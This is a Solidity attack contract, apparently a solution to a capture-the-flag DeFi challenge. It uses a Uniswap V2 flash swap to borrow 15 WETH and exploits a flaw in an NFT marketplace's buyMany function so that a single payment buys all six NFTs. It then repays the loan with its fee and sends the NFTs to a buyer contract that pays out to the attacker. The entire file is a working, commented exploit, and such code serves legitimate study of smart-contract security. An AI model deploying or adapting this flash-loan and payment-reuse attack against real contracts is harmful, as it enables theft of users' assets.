// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface FreeRiderNFTMarketplace_ {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface Nft_ {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) external;
}

interface UniswapPair_ {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface Weth_ {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract FreeRiderAttacker {
    FreeRiderNFTMarketplace_ market;
    Nft_ nft;
    UniswapPair_ uniswapPair;
    Weth_ weth;
    address buyer;

    constructor(
        address _market,
        address _nft,
        address _uniswapPair,
        address _weth,
        address _buyer
    ) {
        market = FreeRiderNFTMarketplace_(_market);
        nft = Nft_(_nft);
        uniswapPair = UniswapPair_(_uniswapPair);
        weth = Weth_(_weth);
        buyer = _buyer;
    }

    function attack() external payable {
        // Junk byte argument tells Uniswap this is a flash swap
        // Attacker MUST send at least 0.045135406218655967 ETH to pay the fee for the 15 WETH flash swap
        uniswapPair.swap(15 ether, 0, address(this), hex"01");
    }

    // Callback for the flash swap
    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        // Unwrap the flash swapped WETH to use for buying NFTs
        weth.withdraw(15 ether);

        // Expoit the faulty buyMany logic to acquire all NFTs for free
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        market.buyMany{value: 15 ether}(tokenIds);

        // Pay back the flash swap. Must include a 0.3% fee on the amount returned, i.e.:
        // 15 / .997 = 15.045135406218655967
        weth.deposit{value: 15.045135406218655968 ether}();
        weth.transfer(address(uniswapPair), 15.045135406218655968 ether);

        // Send NFTs to the buyer. Buyer automatically pays out directly to the attacker address,
        // not this address.
        nft.safeTransferFrom(address(this), buyer, 0, hex"00");
        nft.safeTransferFrom(address(this), buyer, 1, hex"00");
        nft.safeTransferFrom(address(this), buyer, 2, hex"00");
        nft.safeTransferFrom(address(this), buyer, 3, hex"00");
        nft.safeTransferFrom(address(this), buyer, 4, hex"00");
        nft.safeTransferFrom(address(this), buyer, 5, hex"00");
    }

    // Callback for ERC-721 safeTransferFrom
    // Reference: https://eips.ethereum.org/EIPS/eip-721
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return 0x150b7a02; // bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))
    }

    // To accept unwrapped ETH
    receive() external payable {}
}
